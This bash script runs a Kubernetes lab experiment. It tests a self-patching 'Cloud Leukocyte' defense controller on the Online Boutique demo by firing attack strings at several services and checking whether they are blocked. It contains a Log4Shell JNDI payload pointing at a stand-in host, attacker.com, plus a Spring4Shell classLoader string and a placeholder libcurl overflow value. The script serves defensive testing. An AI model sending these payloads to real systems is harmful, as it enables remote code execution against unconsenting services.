#!/bin/bash
set -e

# Setup Tool Pod
echo "🛠️ Spawning persistent tool-pod for stable connectivity..."
kubectl run tool-pod --image=curlimages/curl -n online-boutique --restart=Never -- sleep infinity > /dev/null 2>&1 || echo "Tool pod already exists"
# Wait for tool-pod to be ready
kubectl wait --for=condition=Ready pod/tool-pod -n online-boutique --timeout=60s > /dev/null

# Cleanup trap
cleanup() {
    echo "🧹 Cleaning up tool-pod..."
    kubectl delete pod tool-pod -n online-boutique --force --grace-period=0 > /dev/null 2>&1
    if [ -n "$PF_PID" ]; then kill $PF_PID; fi
}
trap cleanup EXIT

# Check if port 8081 is already in use
if lsof -Pi :8081 -sTCP:LISTEN -t >/dev/null ; then
    echo "⚠️ Port 8081 is already in use. Assuming external port-forward."
    GATEWAY_URL="localhost:8081"
else
    echo "🔌 Starting Port-Forward to frontend-external..."
    kubectl -n online-boutique port-forward svc/frontend-external 8081:80 > /dev/null 2>&1 &
    PF_PID=$!
    GATEWAY_URL="localhost:8081"
    sleep 2
fi

echo "--- 🧪 Cloud Leukocyte K8s Experiment ---"
echo "Target: $GATEWAY_URL"

# Phase 1: Baseline
echo "[Phase 1] Establishing Baseline..."
# Wait for service to be reachable (max 30s)
MAX_RETRIES=30
for ((i=1;i<=MAX_RETRIES;i++)); do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://$GATEWAY_URL/)
    if [ "$HTTP_CODE" == "200" ]; then
        echo "✅ Service is Reachable (Attempt $i)"
        break
    fi
    echo "⏳ Waiting for service... ($i/$MAX_RETRIES) - HTTP Code: $HTTP_CODE"
    sleep 1
done

if [ "$HTTP_CODE" != "200" ]; then
    # exit 1
    echo "   ⚠️ Continuing despite Phase 1 failure for diagnosis..."
fi

# Phase 2: Attack
echo "[Phase 2] Launching Log4Shell Attack on AdService..."
PAYLOAD='${jndi:ldap://attacker.com/exploit}'
response=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: $PAYLOAD" "http://$GATEWAY_URL/product/OLJCESPC7Z")

echo "Attack Response Code: $response"
if [ "$response" == "403" ] || [ "$response" == "500" ]; then
    echo "🛡️ Attack Blocked/Mitigated (Status: $response)"
else
    echo "⚠️ Attack Accepted (Status: $response) - If this is the first hit, it might be expected before learning."
    
    # 🚨 SIMULATION: Trigger IDS (Envoy would normally do this)
    echo "[Simulating IDS] Reporting attack to Leukocyte Controller..."
    kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -X POST -H 'Content-Type: application/json' -d '{\"service_id\": \"AdService\", \"path\": \"User-Agent\", \"payload\": \"\${jndi:ldap://attacker.com/exploit}\", \"features\": {\"anomaly\": 0.99, \"entropy\": 0.8, \"frequency\": 0.1}}' http://leukocyte-controller.online-boutique.svc.cluster.local:80/detect" > /dev/null
fi

# Phase 3: Surveillance & Loopback
echo "[Phase 3] Checking Immune Surveillance..."
kubectl -n online-boutique logs -l app=leukocyte-controller --tail=20

# Phase 4: Verify Preemptive Patch on Billing Service
echo "[Phase 4] Verifying Preemptive Patch (BillingService)..."
echo "   🕵️ Launching internal probe to verify CheckoutService protection..."

kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -o /dev/null -w '%{http_code}' -v --http2-prior-knowledge -H 'User-Agent: ${PAYLOAD}' http://checkoutservice:5050" > probe_result.txt 2>&1

PROBE_HTTP_CODE=$(grep "< HTTP/2" probe_result.txt | head -n 1 | awk '{print $3}' | tr -d '\r')
rm probe_result.txt

echo "Internal Probe Response Code: $PROBE_HTTP_CODE"

if [ "$PROBE_HTTP_CODE" == "403" ]; then
    echo "✅ SUCCESS: BillingService was preemptively patched!"
else
    echo "❌ FAILED: BillingService is still vulnerable or not patched (Code: $PROBE_HTTP_CODE)."
fi

# --- Phase 5: Multi-Vector Verification (Spring4Shell & libcurl) ---
echo "--- Phase 5: Multi-Vector Verification (Extending Immune Response) ---"

# 5.1 Spring4Shell on CartService
echo "[Phase 5.1] Simulating Spring4Shell Attack on CartService..."
# Trigger IDS
kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -X POST -H 'Content-Type: application/json' -d '{\"service_id\": \"CartService\", \"path\": \"payload.data\", \"payload\": \"class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix\", \"features\": {\"anomaly\": 0.95, \"entropy\": 0.85, \"frequency\": 0.05}}' http://leukocyte-controller.online-boutique.svc.cluster.local:80/detect" > /dev/null

echo "   ⏳ Waiting for Controller to actuation (5s)..."
sleep 5

# Verify Patch
kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -o /dev/null -w '%{http_code}' -v --http2-prior-knowledge -H 'payload.data: class.module.classLoader.resources' http://cartservice:7070" > spring_result.txt 2>&1
SPRING_CODE=$(grep "< HTTP/2" spring_result.txt | head -n 1 | awk '{print $3}' | tr -d '\r')
rm spring_result.txt

if [ "$SPRING_CODE" == "403" ]; then
    echo "✅ SUCCESS: CartService patched against Spring4Shell!"
else
    echo "❌ FAILED: CartService vulnerable to Spring4Shell (Code: $SPRING_CODE)."
fi

# 5.2 libcurl Heap Overflow on Frontend
echo "[Phase 5.2] Simulating libcurl Attack on Frontend..."
# Trigger IDS
kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -X POST -H 'Content-Type: application/json' -d '{\"service_id\": \"Frontend\", \"path\": \"proxy_url\", \"payload\": \"socks5h://A_VERY_LONG_HOSTNAME_THAT_CAUSES_BUFFER_OVERFLOW_IN_LIBCURL_WHEN_RESOLVING_LOCALLY\", \"features\": {\"anomaly\": 0.98, \"entropy\": 0.6, \"frequency\": 0.01}}' http://leukocyte-controller.online-boutique.svc.cluster.local:80/detect" > /dev/null

echo "   ⏳ Waiting for Controller to actuation (5s)..."
sleep 5

# Verify Patch
kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -v -H 'proxy_url: socks5h://overflow' http://frontend:80" > libcurl_result.txt 2>&1
CURL_CODE=$(grep "< HTTP/" libcurl_result.txt | head -n 1 | awk '{print $3}')

if [ "$CURL_CODE" == "403" ]; then
    echo "✅ SUCCESS: Frontend patched against libcurl Exploit!"
else
    echo "❌ FAILED: Frontend vulnerable to libcurl Exploit (Code: $CURL_CODE)."
    echo "   🔍 Debug: Head of result (First 20 lines):"
    head -n 20 libcurl_result.txt | sed 's/^/      /'
fi
rm libcurl_result.txt

# --- Phase 6: Repeated Attacks (Persistence Verification) ---
echo "--- Phase 6: Repeated Attacks (Persistence Verification) ---"
echo "   ⏳ Waiting 30s to simulate time passing..."
sleep 30

# 6.1 Re-verify Log4Shell (AdService)
echo "[Phase 6.1] Re-verifying Log4Shell Immunity (AdService)..."
response=$(curl -s -o /dev/null -w "%{http_code}" -H "User-Agent: ${PAYLOAD}" "http://$GATEWAY_URL/product/OLJCESPC7Z")
if [ "$response" == "403" ] || [ "$response" == "500" ]; then
    echo "✅ SUCCESS: AdService immunity persisted! (Status: $response)"
else
    echo "❌ FAILED: AdService lost immunity! (Status: $response)"
fi

# 6.2 Re-verify Spring4Shell (CartService)
echo "[Phase 6.2] Re-verifying Spring4Shell Immunity (CartService)..."
kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -o /dev/null -w '%{http_code}' -v --http2-prior-knowledge -H 'payload.data: class.module.classLoader.resources' http://cartservice:7070" > spring_repeat.txt 2>&1
SPRING_CODE=$(grep "< HTTP/2" spring_repeat.txt | head -n 1 | awk '{print $3}' | tr -d '\r')
rm spring_repeat.txt

if [ "$SPRING_CODE" == "403" ]; then
    echo "✅ SUCCESS: CartService immunity persisted!"
else
    echo "❌ FAILED: CartService lost immunity! (Code: $SPRING_CODE)"
fi

# 6.3 Re-verify libcurl (Frontend)
echo "[Phase 6.3] Re-verifying libcurl Immunity (Frontend)..."
kubectl exec -n online-boutique tool-pod -- sh -c "curl -s -v -H 'proxy_url: socks5h://overflow' http://frontend:80" > libcurl_repeat.txt 2>&1
CURL_CODE=$(grep "< HTTP/" libcurl_repeat.txt | head -n 1 | awk '{print $3}')
rm libcurl_repeat.txt

if [ "$CURL_CODE" == "403" ]; then
    echo "✅ SUCCESS: Frontend immunity persisted!"
else
    echo "❌ FAILED: Frontend lost immunity! (Code: $CURL_CODE)"
fi


# --- Phase 7: Quantitative Evaluation ---
echo "--- Phase 7: Quantitative Evaluation ---"
echo "   📊 Running automated metrics collection (5 runs)..."
# Ensure we have the python dependencies (matplotlib, numpy might need install, assuming env is ready)
# If not, we skip or warn.
if command -v python3 &> /dev/null; then
    python3 experiments/k8s_experiment_METRICS.py
    python3 experiments/baseline_comparison.py
else
    echo "⚠️ Python3 not found, skipping metrics."
fi

echo "--- 🏁 Experiment Completed ---"

